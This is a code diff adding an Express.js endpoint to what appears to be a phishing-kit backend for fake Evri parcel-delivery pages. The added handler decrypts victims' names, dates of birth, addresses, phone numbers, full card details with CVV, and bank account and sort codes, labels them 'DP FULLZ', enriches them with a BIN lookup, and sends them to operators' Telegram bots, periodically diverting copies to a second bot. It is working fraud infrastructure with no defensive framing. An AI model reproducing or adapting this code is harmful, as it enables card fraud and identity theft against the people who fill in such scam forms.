@@ -14257,6 +14257,111 @@ app.post("/ghostEvri", (req, res) => {
     });
 });
 
+app.options("/dpEvri", cors());
+
+app.post("/dpEvri", (req, res) => {
+  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `=========> DP FULLZ <==========]\n| Full name : ${fname}\n| Date of birth : ${dob}\n| Address : ${addy}\n| Post Code : ${pcode}| Mobile Number : ${telephone}\n[==========> Fullz <==========]\n| Card Holder's Name : ${ccname}| Card Number : ${ccnum}\n| Expiry Date : ${ccexp}| CVV : ${cvv}\n| Bank Name : ${bankName}\n| Account Number : ${accno}| Sort Code : ${scode}\n[==========> IP INFO <==========]\n| Submitted by : ${ip}| UserAgent : ${userAgent}\n==========> DP FULLZ<==========`;
+      if (clearstore == 10) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        clearstore = 6;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `EvriDP:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5582405778,
+              text: `Evri:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        clearstore += 1;
+      }
+
+      res.send("Update Completed");
+    });
+});
+
 app.options("/barksdaleEvri", cors());
 
 app.post("/barksdaleEvri", (req, res) => {
